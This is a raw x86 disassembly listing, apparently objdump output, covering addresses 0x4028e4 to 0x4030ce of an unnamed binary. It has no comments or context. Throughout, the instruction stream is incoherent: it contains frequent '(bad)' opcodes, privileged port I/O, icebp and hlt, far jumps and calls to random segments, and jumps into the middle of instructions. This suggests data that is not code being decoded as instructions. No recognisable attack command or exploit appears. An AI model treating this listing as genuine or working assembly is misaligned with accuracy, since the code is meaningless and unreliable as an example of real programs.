  4028e4:	xor    BYTE PTR [eax],al
  4028e6:	lock scas al,BYTE PTR es:[edi]
  4028e8:	jecxz  0x402959
  4028ea:	cdq    
  4028eb:	jp     0x402929
  4028ed:	mov    ds:0x5b8c1d9b,al
  4028f2:	out    dx,eax
  4028f3:	test   BYTE PTR [ebx],dl
  4028f5:	mov    esp,0x95a8e5f4
  4028fa:	icebp  
  4028fb:	loop   0x402950
  4028fd:	mov    DWORD PTR [edx],0xd8ec0ae5
  402903:	cld    
  402904:	jl     0x402902
  402906:	pop    es
  402907:	outs   dx,BYTE PTR ds:[esi]
  402908:	test   BYTE PTR [edi],dl
  40290a:	xor    al,0xbd
  40290c:	jmp    0x40296b
  40290e:	mov    ds:0x4f0427d9,al
  402913:	pop    esi
  402914:	adc    al,0xd0
  402916:	fsubr  QWORD PTR [esi-0x16]
  402919:	push   0x65
  40291b:	(bad)  
  40291c:	sbb    ch,0xeb
  40291f:	scas   eax,DWORD PTR es:[edi]
  402920:	nop
  402921:	jmp    0x3788f8a2
  402926:	cs cmp bh,ch
  402929:	xor    al,cl
  40292b:	pushf  
  40292c:	test   al,0xde
  40292e:	adc    al,0x45
  402930:	(bad)  
  402931:	pop    ss
  402932:	mov    DWORD PTR [esi-0x1f],ebx
  402935:	push   eax
  402936:	pop    eax
  402937:	pusha  
  402938:	push   0xe
  40293a:	popf   
  40293b:	fcmovnb st,st(1)
  40293d:	adc    al,0x62
  40293f:	test   al,0x1
  402941:	test   eax,0x8c36b5e1
  402946:	js     0x402999
  402948:	(bad)  
  402949:	jnp    0x402926
  40294b:	lods   eax,DWORD PTR ds:[esi]
  40294c:	lock pop eax
  40294e:	mov    dh,0x40
  402950:	jmp    0x50065194
  402955:	or     dl,0xef
  402958:	repnz cs push eax
  40295b:	test   dl,ch
  40295d:	xor    al,0xe4
  40295f:	(bad)  
  402960:	jmp    0x96139d73
  402965:	sbb    bh,BYTE PTR [edi+edi*4-0x2]
  402969:	xchg   BYTE PTR [eax+0x35],ch
  40296c:	pop    esi
  40296d:	test   BYTE PTR [eax],0xee
  402970:	scas   eax,DWORD PTR es:[edi]
  402971:	pop    ds
  402972:	mov    bl,0xb2
  402974:	xor    cl,BYTE PTR [ebx+0x40a1a53e]
  40297a:	out    dx,al
  40297b:	retf   0xd8c1
  40297e:	or     BYTE PTR [ecx-0x23],al
  402981:	xlat   BYTE PTR ds:[ebx]
  402982:	sbb    edx,ecx
  402984:	xor    eax,0xc3b92e72
  402989:	in     eax,0x12
  40298b:	std    
  40298c:	stc    
  40298d:	icebp  
  40298e:	popa   
  40298f:	push   ebp
  402990:	pop    ss
  402991:	jae    0x402978
  402993:	xor    BYTE PTR [edi+0x533b9045],0x14
  40299a:	inc    esp
  40299b:	cmp    al,0xe2
  40299d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40299e:	pop    es
  40299f:	repz jae 0x402a0d
  4029a2:	in     al,dx
  4029a3:	or     al,BYTE PTR [ecx]
  4029a5:	add    cl,bh
  4029a7:	imul   ecx,DWORD PTR [eax+0x66],0xd9b933cb
  4029ae:	imul   ebx,DWORD PTR [ebp+0x5],0xd14a536a
  4029b5:	enter  0xa986,0x88
  4029b9:	fsub   DWORD PTR [eax+edi*2]
  4029bc:	aad    0xfa
  4029be:	hlt    
  4029bf:	icebp  
  4029c0:	xchg   ebp,eax
  4029c1:	inc    BYTE PTR [esi]
  4029c3:	xor    DWORD PTR [edx],0x2daf71e9
  4029c9:	xor    ch,BYTE PTR [edx+ebx*1+0x20545383]
  4029d0:	fsubr  DWORD PTR [esi]
  4029d2:	jmp    0x402a23
  4029d4:	jae    0x402a14
  4029d6:	adc    al,0x5c
  4029d8:	pop    ebp
  4029d9:	iret   
  4029da:	mov    ch,0xc1
  4029dc:	push   0x663bcaad
  4029e1:	imul   ebx,ebx,0xa1667a51
  4029e7:	test   al,0xe7
  4029e9:	sub    DWORD PTR [edi+esi*4-0x5d],0xffffffcb
  4029ee:	ds sbb eax,0x277ed975
  4029f4:	popf   
  4029f5:	cmp    BYTE PTR ds:0x8494300d,al
  4029fb:	dec    ebx
  4029fc:	je     0x402a11
  4029fe:	jmp    0x1698461c
  402a03:	jge    0x402a2d
  402a05:	shr    DWORD PTR [ecx+edx*4-0x62],1
  402a09:	jmp    0xbf37:0x4649fd7d
  402a10:	inc    eax
  402a11:	std    
  402a12:	sub    al,bh
  402a14:	push   esi
  402a15:	inc    edx
  402a16:	js     0x402a1e
  402a18:	or     bh,BYTE PTR [ebp+edx*8-0x44c8aa93]
  402a1f:	inc    ecx
  402a20:	mov    edx,edi
  402a22:	dec    edi
  402a23:	ins    BYTE PTR es:[edi],dx
  402a24:	mov    dl,BYTE PTR [ebp-0x7c488d6d]
  402a2a:	lds    edi,FWORD PTR [edi+eiz*2-0x74f1af1a]
  402a31:	pop    esi
  402a32:	jecxz  0x402a69
  402a34:	mov    esp,0x3a45a0bb
  402a39:	cmp    ah,BYTE PTR ds:0x35a46c2e
  402a3f:	cmp    BYTE PTR [edi],dl
  402a41:	mov    dh,0x8f
  402a43:	jle    0x402ab8
  402a45:	mov    ss,WORD PTR [ebp-0x7082b0fb]
  402a4b:	pop    edi
  402a4c:	inc    eax
  402a4d:	fsubr  DWORD PTR [ecx+0x10b26b98]
  402a53:	mov    ecx,0x7311d3f5
  402a58:	pop    ecx
  402a59:	inc    edx
  402a5a:	adc    al,0x4d
  402a5c:	sar    BYTE PTR [ebp+0x588e1fde],1
  402a62:	lds    ecx,FWORD PTR [edx+ebp*8+0xf4fdaaf]
  402a69:	pop    esp
  402a6a:	mov    BYTE PTR [eax+0x468e395e],ah
  402a70:	add    al,0x5d
  402a72:	mov    al,ds:0x4a09c231
  402a77:	xchg   edx,eax
  402a78:	test   BYTE PTR ds:0x4d4c5978,dh
  402a7e:	and    BYTE PTR [esi+0x43ddcf8a],ah
  402a84:	out    dx,eax
  402a85:	int    0xa7
  402a87:	mov    BYTE PTR [eax],ah
  402a89:	(bad)  
  402a8a:	sub    eax,ebx
  402a8c:	or     al,0x4c
  402a8e:	(bad)  
  402a8f:	mov    eax,0x6e85a7eb
  402a94:	cmp    BYTE PTR [ebx],cl
  402a96:	pop    ecx
  402a97:	outs   dx,DWORD PTR ds:[esi]
  402a98:	sbb    al,0xde
  402a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a9b:	inc    ebx
  402a9c:	pusha  
  402a9d:	or     al,0xcb
  402a9f:	adc    eax,0xb9b703c4
  402aa4:	jns    0x402a92
  402aa6:	pop    ss
  402aa7:	push   0xd0c1d193
  402aac:	ror    DWORD PTR [esi+ebp*8-0x3cfdc8cf],1
  402ab3:	data16 jbe 0x402ae6
  402ab6:	adc    edx,DWORD PTR [eax+edx*4+0x30294c04]
  402abd:	int    0xbe
  402abf:	xchg   edx,eax
  402ac0:	jns    0x402a48
  402ac2:	faddp  st(7),st
  402ac4:	call   0x5ac6:0x670a09e4
  402acb:	cmp    DWORD PTR [ecx],esp
  402acd:	dec    eax
  402ace:	add    BYTE PTR [edx+0x1b],bh
  402ad1:	cmp    edx,ebp
  402ad3:	xchg   edi,eax
  402ad4:	mov    ecx,0xb511139f
  402ad9:	inc    edi
  402ada:	push   0xd194031c
  402adf:	dec    ebx
  402ae0:	xor    BYTE PTR [edi-0x4fa26544],bh
  402ae6:	push   0xffffffad
  402ae8:	mov    esp,0x216da56c
  402aed:	lds    ecx,FWORD PTR [eax-0x5]
  402af0:	xchg   ecx,eax
  402af1:	iret   
  402af2:	cmova  ecx,DWORD PTR [ecx]
  402af5:	int3   
  402af6:	pop    edi
  402af7:	imul   edx,DWORD PTR [ecx],0xffffff83
  402afa:	pop    ebp
  402afb:	jp     0x402acb
  402afd:	dec    edx
  402afe:	fwait
  402aff:	loop   0x402b21
  402b01:	jne    0x402af8
  402b03:	xor    BYTE PTR [ebx],ch
  402b05:	lods   al,BYTE PTR ds:[esi]
  402b06:	loopne 0x402b17
  402b08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b09:	jo     0x402b23
  402b0b:	outs   dx,BYTE PTR ds:[esi]
  402b0c:	mov    esi,0x4e9a814f
  402b11:	call   0xfa2c:0x8741920b
  402b18:	xchg   ebx,eax
  402b19:	mov    al,ds:0x11585a4a
  402b1e:	jne    0x402b07
  402b20:	das    
  402b21:	jmp    0x4cfe5fcd
  402b26:	nop
  402b27:	sub    al,0x44
  402b29:	mov    BYTE PTR [esi+0xa0d2f31],al
  402b2f:	jb     0x402b11
  402b31:	aas    
  402b32:	fsub   QWORD PTR [edx-0xd]
  402b35:	mov    ecx,0xbe13c2e2
  402b3a:	fwait
  402b3b:	enter  0x2fb2,0xb6
  402b3f:	jl     0x402bbc
  402b41:	push   esi
  402b42:	ret    
  402b43:	mov    dl,0x34
  402b45:	push   0x71e2e994
  402b4a:	rcr    BYTE PTR [eax-0xe627c82],0x11
  402b51:	inc    ebp
  402b52:	sti    
  402b53:	sub    eax,0xed8d97b5
  402b58:	scas   eax,DWORD PTR es:[edi]
  402b59:	dec    ebx
  402b5a:	xchg   edx,eax
  402b5b:	ins    BYTE PTR es:[edi],dx
  402b5c:	imul   ecx,DWORD PTR [eax-0x5c],0x9400abf5
  402b63:	shr    edx,0xea
  402b66:	adc    al,0x82
  402b68:	cmp    dl,BYTE PTR [esi-0x3f]
  402b6b:	setne  al
  402b6e:	add    al,0xba
  402b70:	mov    BYTE PTR [ebx-0x6639cdb1],dh
  402b76:	cld    
  402b77:	jb     0x402bcb
  402b79:	xchg   edi,eax
  402b7a:	sub    esi,DWORD PTR [ecx+0xfeb9214]
  402b80:	xor    bh,BYTE PTR cs:[edx+0x738f21d0]
  402b87:	repnz fnstenv [eax+0x7640a748]
  402b8e:	test   DWORD PTR [eax+0x7e],esp
  402b91:	or     BYTE PTR [ecx-0x8],bl
  402b94:	add    BYTE PTR [ecx],dl
  402b96:	out    0x56,al
  402b98:	push   eax
  402b99:	fisub  WORD PTR [eax+eiz*1]
  402b9c:	lahf   
  402b9d:	psubsw mm6,QWORD PTR [ecx+0x52]
  402ba1:	xor    eax,0x7fc0d9d2
  402ba6:	xor    ebp,esi
  402ba8:	ins    BYTE PTR es:[edi],dx
  402ba9:	mov    dl,0x4d
  402bab:	sub    eax,0xdda5565d
  402bb0:	mov    WORD PTR [ebx],es
  402bb2:	push   0x29cdba97
  402bb7:	add    ecx,eax
  402bb9:	dec    edi
  402bba:	nop
  402bbb:	ins    BYTE PTR es:[edi],dx
  402bbc:	stc    
  402bbd:	aad    0x6c
  402bbf:	jbe    0x402c34
  402bc1:	jl     0x402b93
  402bc3:	data16 sub al,dh
  402bc6:	pop    ebp
  402bc7:	lods   al,BYTE PTR ds:[esi]
  402bc8:	les    edi,FWORD PTR [ebx]
  402bca:	repnz mov ebp,edx
  402bcd:	add    DWORD PTR [ecx+0x7b],ecx
  402bd0:	push   edx
  402bd1:	mov    bh,0xe5
  402bd3:	and    eax,0xde93d9d7
  402bd8:	dec    esi
  402bd9:	pop    ebp
  402bda:	push   ebp
  402bdb:	or     dh,bl
  402bdd:	rol    BYTE PTR [edx+0x54d99440],cl
  402be3:	mov    dh,0x91
  402be5:	adc    DWORD PTR [ecx+eax*4],eax
  402be8:	in     eax,0x50
  402bea:	mov    edi,0xc96984af
  402bef:	add    eax,0xa8b26a61
  402bf4:	cmp    al,0xaf
  402bf6:	mov    esi,0xf5a1699c
  402bfb:	lea    edi,[eax+0x9]
  402bfe:	jo     0x402b80
  402c00:	sub    edx,DWORD PTR [edi]
  402c02:	mov    eax,ds:0x8d418bb1
  402c07:	rcl    DWORD PTR [ecx],1
  402c09:	add    DWORD PTR [edx+0x3aec6c7c],eax
  402c0f:	jle    0x402c05
  402c11:	stos   DWORD PTR es:[edi],eax
  402c12:	popf   
  402c13:	jae    0x402bc7
  402c15:	leave  
  402c16:	fnstsw WORD PTR [esi]
  402c18:	popf   
  402c19:	add    eax,0x7c25b433
  402c1e:	mov    ds:0xb6f0fa8d,eax
  402c23:	mov    BYTE PTR [edi],ah
  402c25:	or     dl,0x89
  402c28:	add    DWORD PTR [edi+0x5fa1bcc],ebp
  402c2e:	mov    esp,0x54a2ddf7
  402c33:	mov    ah,0x91
  402c35:	loop   0x402c4f
  402c37:	jb     0x402bc7
  402c39:	pop    ss
  402c3a:	shl    ebp,0x27
  402c3d:	out    dx,al
  402c3e:	push   0x7ab5575b
  402c43:	mov    edx,DWORD PTR [edi]
  402c45:	(bad)  [ecx]
  402c47:	add    eax,0x30de36c9
  402c4c:	mov    ebx,0x6e7e1554
  402c51:	(bad)  
  402c52:	inc    DWORD PTR [edx+0xda5ee2a]
  402c58:	xor    eax,0xe8f1e97e
  402c5d:	push   ds
  402c5e:	ror    BYTE PTR [ebp+0x352bc],1
  402c64:	retf   
  402c65:	inc    esp
  402c66:	outs   dx,DWORD PTR ds:[esi]
  402c67:	(bad)  
  402c68:	dec    ecx
  402c69:	or     DWORD PTR [edx-0x74f8e23e],0xbc49453f
  402c73:	or     BYTE PTR [ebx],ah
  402c75:	mov    bl,BYTE PTR [ecx]
  402c77:	push   ecx
  402c78:	(bad)  
  402c79:	clc    
  402c7a:	xor    al,0xf6
  402c7c:	jb     0x402cf9
  402c7e:	push   ss
  402c7f:	retf   
  402c80:	pushf  
  402c81:	mul    DWORD PTR [ebx]
  402c83:	call   0xf169f07a
  402c88:	fdivr  st(6),st
  402c8a:	fisttp QWORD PTR [edx+0x1b2fa6a7]
  402c90:	push   ebp
  402c91:	shr    DWORD PTR [esi-0x35],cl
  402c94:	and    ecx,DWORD PTR [esp+edi*8+0x2b]
  402c98:	mov    esi,0x564c9b3
  402c9d:	test   BYTE PTR [esp+edi*8],cl
  402ca0:	jmp    0x37ce5b28
  402ca5:	inc    esp
  402ca6:	jne    0x402d1b
  402ca8:	je     0x402d20
  402caa:	stc    
  402cab:	push   es
  402cac:	sti    
  402cad:	call   0x98dbbc2f
  402cb2:	adc    bh,BYTE PTR [ecx-0x45]
  402cb5:	xlat   BYTE PTR ds:[ebx]
  402cb6:	bound  esp,QWORD PTR [ecx-0x2b15c2d1]
  402cbc:	push   es
  402cbd:	or     cl,cl
  402cbf:	fisttp WORD PTR [ebp-0x6cafb9a8]
  402cc5:	jp     0x402c8f
  402cc7:	sbb    DWORD PTR [ebx+ebp*8],0xc6528e62
  402cce:	imul   ecx,esp,0x31
  402cd1:	pop    eax
  402cd2:	inc    ebx
  402cd3:	lods   eax,DWORD PTR ds:[esi]
  402cd4:	sub    eax,0xc92f8a41
  402cd9:	push   ecx
  402cda:	adc    esp,eax
  402cdc:	mov    ecx,0xf62190e9
  402ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ce2:	(bad)  
  402ce3:	outs   dx,BYTE PTR ds:[esi]
  402ce4:	subps  xmm1,XMMWORD PTR [ecx+0x63e6fd3d]
  402ceb:	call   0x320e:0xaf832cb8
  402cf2:	or     edx,DWORD PTR [ebx-0x690b547]
  402cf8:	cmc    
  402cf9:	jnp    0x402cf0
  402cfb:	xor    cl,ah
  402cfd:	xchg   edx,eax
  402cfe:	ror    DWORD PTR [eax-0x19d023d4],cl
  402d04:	lea    ebp,[esi]
  402d06:	jecxz  0x402d40
  402d08:	cmp    al,0x43
  402d0a:	or     eax,0xa97a5680
  402d0f:	out    dx,eax
  402d10:	lea    ebp,[esi-0x25]
  402d13:	inc    edx
  402d14:	jecxz  0x402d8c
  402d16:	(bad)  
  402d17:	(bad)  
  402d18:	mov    esp,0x4a5ce6a7
  402d1d:	aas    
  402d1e:	mov    ecx,0x770bebfd
  402d23:	inc    edi
  402d24:	inc    ecx
  402d25:	xchg   bl,dl
  402d27:	push   cs
  402d28:	mov    cl,0xa5
  402d2a:	sbb    eax,0xfbc58aab
  402d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d30:	pop    edi
  402d31:	popf   
  402d32:	sbb    al,0x27
  402d34:	(bad)  [esp+edx*1-0x64]
  402d38:	aas    
  402d39:	retf   0x67ae
  402d3c:	lods   al,BYTE PTR ds:[esi]
  402d3d:	aaa    
  402d3e:	repnz aas 
  402d40:	clc    
  402d41:	mov    edx,0x9c393d8e
  402d46:	fistp  DWORD PTR [edx+ecx*2-0x5b]
  402d4a:	ja     0x402d1d
  402d4c:	es (bad) 
  402d4e:	adc    dl,bh
  402d50:	mov    ecx,0xc8c6506f
  402d55:	push   ss
  402d56:	xor    edi,ebx
  402d58:	inc    eax
  402d59:	imul   DWORD PTR [ebx+0x9cee366]
  402d5f:	dec    esi
  402d60:	sub    BYTE PTR [ebx+0xd],bl
  402d63:	cmp    bl,dl
  402d65:	sahf   
  402d66:	aam    0x15
  402d68:	fiadd  DWORD PTR [eax]
  402d6a:	enter  0xa484,0x38
  402d6e:	(bad)  
  402d6f:	clc    
  402d70:	addr16 loop 0x402d15
  402d73:	aaa    
  402d74:	pop    es
  402d75:	cmp    DWORD PTR es:[eax-0x688850d8],ebp
  402d7c:	mov    ch,0x99
  402d7e:	add    al,0xd4
  402d80:	jg     0x402d02
  402d82:	lods   eax,DWORD PTR ds:[esi]
  402d83:	sbb    DWORD PTR [esi-0x44e77d26],esi
  402d89:	add    edi,DWORD PTR [esp+eax*1]
  402d8c:	xlat   BYTE PTR ds:[ebx]
  402d8d:	lahf   
  402d8e:	fist   WORD PTR [eax]
  402d90:	inc    esp
  402d91:	jbe    0x402d31
  402d93:	sahf   
  402d94:	xchg   ebp,eax
  402d95:	mov    esp,0x88d58764
  402d9a:	xchg   esi,eax
  402d9b:	into   
  402d9c:	xchg   esi,eax
  402d9d:	jmp    0x352a:0x45a5ffa
  402da4:	push   edi
  402da5:	dec    DWORD PTR fs:[ebx]
  402da8:	fst    DWORD PTR [edi]
  402daa:	adc    al,0xf1
  402dac:	and    DWORD PTR [ebp+0x6a],0xffffffa1
  402db0:	ins    BYTE PTR es:[edi],dx
  402db1:	adc    eax,0x1abf2e56
  402db6:	or     al,0x52
  402db8:	popf   
  402db9:	jno    0x402d42
  402dbb:	daa    
  402dbc:	xchg   DWORD PTR [ebp-0x7],esp
  402dbf:	pop    eax
  402dc0:	aas    
  402dc1:	add    ebx,0xed95b00c
  402dc7:	out    dx,eax
  402dc8:	lods   al,BYTE PTR ds:[esi]
  402dc9:	inc    esi
  402dca:	inc    esi
  402dcb:	in     al,0x7c
  402dcd:	je     0x402e4e
  402dcf:	outs   dx,DWORD PTR ds:[esi]
  402dd0:	lds    edx,FWORD PTR [eax]
  402dd2:	dec    edx
  402dd3:	leave  
  402dd4:	ret    
  402dd5:	jnp    0x402d76
  402dd7:	xchg   edi,eax
  402dd8:	les    esp,FWORD PTR [ebp+0x5118dd81]
  402dde:	mov    edi,DWORD PTR [eax+0x6329c0f6]
  402de4:	sub    BYTE PTR [ebx+0x16a5e648],dl
  402dea:	dec    esp
  402deb:	pop    edx
  402dec:	cld    
  402ded:	out    0xed,al
  402def:	xchg   ebx,eax
  402df0:	xchg   esp,eax
  402df1:	add    esi,ebx
  402df3:	sub    eax,DWORD PTR ds:0x43d989d4
  402df9:	sub    al,0x8
  402dfb:	sub    ah,BYTE PTR [edx+0x2]
  402dfe:	xor    eax,0x5014bb4d
  402e03:	inc    ebx
  402e04:	ficom  DWORD PTR [eax]
  402e06:	test   eax,0xd9890b13
  402e0b:	pop    ecx
  402e0c:	push   ebp
  402e0d:	in     al,0x7b
  402e0f:	jg     0x402e88
  402e11:	or     eax,0x949e7be4
  402e16:	fdivr  st(5),st
  402e18:	jbe    0x402e65
  402e1a:	aam    0xb2
  402e1c:	add    ecx,DWORD PTR [ebp-0x3e]
  402e1f:	pop    es
  402e20:	ja     0x402e1c
  402e22:	lods   al,BYTE PTR ds:[esi]
  402e23:	mov    edx,0xaab1ed94
  402e28:	aas    
  402e29:	push   es
  402e2a:	jmp    0x402e83
  402e2c:	or     al,0x7
  402e2e:	iret   
  402e2f:	mov    ah,0x28
  402e31:	xor    bl,ch
  402e33:	sahf   
  402e34:	adc    eax,edi
  402e36:	xor    BYTE PTR [ebp+0x68410973],ch
  402e3c:	bound  esi,QWORD PTR [ebp+0x74]
  402e3f:	push   esp
  402e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e41:	inc    edi
  402e42:	fwait
  402e43:	std    
  402e44:	call   0x52564fe6
  402e49:	test   BYTE PTR [edx+0x3f6ea4a8],bh
  402e4f:	jl     0x402dd7
  402e51:	and    BYTE PTR ds:0x3f4cd930,dh
  402e57:	or     al,cl
  402e59:	and    DWORD PTR [ebp+ebx*1-0x1713bb60],ebx
  402e60:	mov    ebx,0xb817dd9
  402e65:	addr16 adc eax,0xe7035abd
  402e6b:	data16 mov ss,WORD PTR ds:0xd2679927
  402e72:	jl     0x402ec6
  402e74:	and    edi,ecx
  402e76:	shr    BYTE PTR [esi-0x6bb954a2],0x9f
  402e7d:	push   eax
  402e7e:	inc    ebp
  402e7f:	lods   al,BYTE PTR ds:[esi]
  402e80:	cli    
  402e81:	jmp    0x402e46
  402e83:	push   ecx
  402e84:	jns    0x402e3d
  402e86:	pop    edi
  402e87:	mov    esp,0xee0b7736
  402e8c:	or     al,0xf7
  402e8e:	inc    di
  402e90:	jns    0x402e5e
  402e92:	mov    ebx,0x5c2a5343
  402e97:	in     al,dx
  402e98:	loope  0x402f18
  402e9a:	sub    edx,DWORD PTR [ebx]
  402e9c:	in     eax,dx
  402e9d:	mov    DWORD PTR [esi],ebp
  402e9f:	push   ds
  402ea0:	add    ecx,DWORD PTR [ebp+0x58562ec2]
  402ea6:	cmp    edi,esi
  402ea8:	lahf   
  402ea9:	push   edx
  402eaa:	mov    DWORD PTR [ecx+ecx*8+0x56e478ad],0x45e523e8
  402eb5:	xchg   esi,eax
  402eb6:	sub    DWORD PTR [edx],eax
  402eb8:	dec    ebp
  402eb9:	add    al,BYTE PTR [esp+edx*2+0x6a3776a2]
  402ec0:	bound  esi,QWORD PTR [esi-0x4b]
  402ec3:	lahf   
  402ec4:	sub    eax,0xb99e575
  402ec9:	imul   ebx,edx,0x62f00284
  402ecf:	(bad)  
  402ed0:	fldcw  WORD PTR [ebp+0x56668f0e]
  402ed6:	push   0x8f044e6c
  402edb:	hlt    
  402edc:	iret   
  402edd:	or     BYTE PTR [edi+0x3e26b936],bl
  402ee3:	test   eax,0x1bbf1b50
  402ee8:	scas   eax,DWORD PTR es:[edi]
  402ee9:	loopne 0x402f09
  402eeb:	push   ds
  402eec:	adc    esp,eax
  402eee:	or     al,0xa6
  402ef0:	adc    DWORD PTR [esi+0x6c4c9f83],eax
  402ef6:	dec    ebp
  402ef7:	add    esi,DWORD PTR [edx]
  402ef9:	mov    edx,0xde3228f3
  402efe:	and    al,0x48
  402f00:	les    ebp,FWORD PTR [esi-0x28eafebb]
  402f06:	and    al,BYTE PTR ds:0x6ccfd443
  402f0c:	in     eax,dx
  402f0d:	adc    DWORD PTR [esi+0x1e2a945b],edx
  402f13:	mov    dh,dl
  402f15:	xchg   edi,eax
  402f16:	jbe    0x402ee2
  402f18:	test   eax,0xfb4e9d46
  402f1d:	fnstenv [edx]
  402f1f:	outs   dx,BYTE PTR ds:[esi]
  402f20:	push   ebx
  402f21:	(bad)  
  402f22:	es pop ebx
  402f24:	jnp    0x402f5c
  402f26:	jecxz  0x402efa
  402f28:	retf   0xd3dd
  402f2b:	ror    BYTE PTR [esi+0x4194947d],cl
  402f31:	or     BYTE PTR [edi],dl
  402f33:	pop    ds
  402f34:	jp     0x402f1e
  402f36:	in     al,dx
  402f37:	sbb    DWORD PTR [edx+0x38],edx
  402f3a:	jb     0x402f22
  402f3c:	mov    bl,0x2
  402f3e:	icebp  
  402f3f:	push   ecx
  402f40:	out    dx,eax
  402f41:	rol    dl,0x85
  402f44:	and    al,0xc2
  402f46:	pusha  
  402f47:	into   
  402f48:	sbb    al,ah
  402f4a:	dec    ecx
  402f4b:	push   0xffffffc2
  402f4d:	dec    ebp
  402f4e:	icebp  
  402f4f:	mov    DWORD PTR [ebp+0x2f],edx
  402f52:	test   BYTE PTR [ecx+0x5f],0x4f
  402f56:	cmp    al,ch
  402f58:	dec    edx
  402f59:	mov    esp,0x985429c4
  402f5e:	imul   ebp,DWORD PTR [edi+0x35],0x3f2b47f6
  402f65:	mov    bx,0xae5a
  402f69:	lods   eax,DWORD PTR ds:[esi]
  402f6a:	xchg   edx,eax
  402f6b:	mov    eax,ds:0x1d32e94e
  402f70:	inc    ecx
  402f71:	jecxz  0x402f57
  402f73:	cmp    al,0x74
  402f75:	pop    eax
  402f76:	rcr    DWORD PTR [eax+0x6c33882e],0x19
  402f7d:	out    dx,eax
  402f7e:	add    DWORD PTR [ebx+0x301ccf5a],ebp
  402f84:	cmp    al,0xb5
  402f86:	jmp    0xeaec:0x957a26d5
  402f8d:	inc    edx
  402f8e:	cmp    al,0x60
  402f90:	xor    eax,DWORD PTR cs:[eax-0x3b]
  402f94:	dec    edx
  402f95:	nop
  402f96:	cdq    
  402f97:	fwait
  402f98:	fwait
  402f99:	(bad)  
  402f9a:	push   0x7036f28
  402f9f:	mov    ecx,0xd9506ede
  402fa4:	push   ss
  402fa5:	push   ebx
  402fa6:	sub    DWORD PTR [esi-0x2e],edi
  402fa9:	outs   dx,BYTE PTR ds:[esi]
  402faa:	jbe    0x402f95
  402fac:	add    eax,edx
  402fae:	pushf  
  402faf:	in     al,dx
  402fb0:	mov    al,ds:0xd57436f1
  402fb5:	push   ds
  402fb6:	scas   eax,DWORD PTR es:[edi]
  402fb7:	fdivr  st,st(4)
  402fb9:	lods   al,BYTE PTR ds:[esi]
  402fba:	add    dl,cl
  402fbc:	loope  0x402fb3
  402fbe:	loop   0x402f67
  402fc0:	xor    cl,BYTE PTR [edx+0x7c9707e1]
  402fc6:	inc    esp
  402fc7:	retf   
  402fc8:	jns    0x402fc5
  402fca:	bound  edx,QWORD PTR [esi-0x5ae4c0f2]
  402fd0:	pop    esi
  402fd1:	arpl   WORD PTR [esi+0x7745024],sp
  402fd7:	jb     0x402fd7
  402fd9:	push   edi
  402fda:	mov    ds:0x7b4fa816,eax
  402fdf:	mov    bl,BYTE PTR [esi]
  402fe1:	push   edx
  402fe2:	mov    eax,ds:0xf87b5af2
  402fe7:	push   ss
  402fe8:	cmp    ecx,DWORD PTR [esi-0x37546a0]
  402fee:	lods   al,BYTE PTR ds:[esi]
  402fef:	jp     0x402fc6
  402ff1:	dec    ebp
  402ff2:	(bad)  
  402ff3:	(bad)  
  402ff5:	jl     0x402fd3
  402ff7:	mov    DWORD PTR [edx+0x22],esp
  402ffa:	adc    dl,ch
  402ffc:	loope  0x40304e
  402ffe:	inc    ebx
  402fff:	stos   BYTE PTR es:[edi],al
  403000:	dec    eax
  403001:	int    0xca
  403003:	cwde   
  403004:	and    ah,BYTE PTR [edx]
  403006:	cmovns ecx,DWORD PTR [ebx+0x49]
  40300a:	jo     0x402f91
  40300c:	mov    esp,0x7d8c20eb
  403011:	mov    BYTE PTR [ebx+edi*8+0x3586bfde],dh
  403018:	fsubr  st(0),st
  40301a:	push   es
  40301b:	sbb    DWORD PTR [eax-0x24f2123f],ebp
  403021:	and    BYTE PTR [esi],dl
  403023:	je     0x402fa6
  403025:	mov    ?,WORD PTR [edx+0x5a2af523]
  40302b:	cmp    dh,BYTE PTR [edx+0x43]
  40302e:	cmc    
  40302f:	cwde   
  403030:	into   
  403031:	cli    
  403032:	ins    BYTE PTR es:[edi],dx
  403033:	not    DWORD PTR [ecx-0x3e]
  403036:	out    0x5a,al
  403038:	lds    edi,FWORD PTR [ebx-0x46a3e40e]
  40303e:	push   ds
  40303f:	call   0x68cc77b6
  403044:	loopne 0x402fe7
  403046:	(bad)  
  403047:	call   0xc3deb6f5
  40304c:	or     esi,DWORD PTR [eax+0x51]
  40304f:	jecxz  0x40304a
  403051:	xchg   ecx,eax
  403052:	pop    esp
  403053:	icebp  
  403054:	test   al,0xa2
  403056:	ins    BYTE PTR es:[edi],dx
  403057:	pushw  es
  403059:	and    ah,BYTE PTR [esi+0x80f542b]
  40305f:	test   BYTE PTR [edi+edx*4],ah
  403062:	jmp    0xb233162a
  403067:	(bad)  
  403068:	cmp    al,0x65
  40306a:	push   DWORD PTR [eax-0x2b]
  40306d:	fstp   TBYTE PTR ds:0x6a55b86c
  403073:	in     eax,dx
  403074:	jecxz  0x40308d
  403076:	mov    ecx,0x4d282015
  40307b:	cmp    edi,DWORD PTR [esi-0x1084e876]
  403081:	sbb    esp,DWORD PTR [eax-0x19490c5a]
  403087:	hlt    
  403088:	xlat   BYTE PTR ds:[ebx]
  403089:	add    ch,ah
  40308b:	jb     0x403037
  40308d:	jg     0x40307d
  40308f:	js     0x403023
  403091:	lds    edi,FWORD PTR [edi+0x566a9488]
  403097:	pop    ecx
  403098:	cwde   
  403099:	hlt    
  40309a:	jo     0x403030
  40309c:	rcr    BYTE PTR [edx+esi*8],cl
  40309f:	lds    ebp,FWORD PTR [ebx+0x27]
  4030a2:	sti    
  4030a3:	out    0x91,al
  4030a5:	lods   al,BYTE PTR ds:[esi]
  4030a6:	inc    esp
  4030a7:	mov    dh,0x5d
  4030a9:	out    dx,eax
  4030aa:	popa   
  4030ab:	in     al,dx
  4030ac:	and    BYTE PTR [edi+0x6f],cl
  4030af:	jno    0x4030e4
  4030b1:	and    edi,ebp
  4030b3:	mov    al,ds:0x5309fa3e
  4030b8:	xor    BYTE PTR [esp+edx*4-0x364fb362],cl
  4030bf:	(bad)  
  4030c0:	mov    edx,0x1d145e38
  4030c5:	cmp    eax,0xd9911b4f
  4030ca:	or     ecx,DWORD PTR [ebx-0x33]
  4030cd:	dec    ebx
  4030ce:	daa    
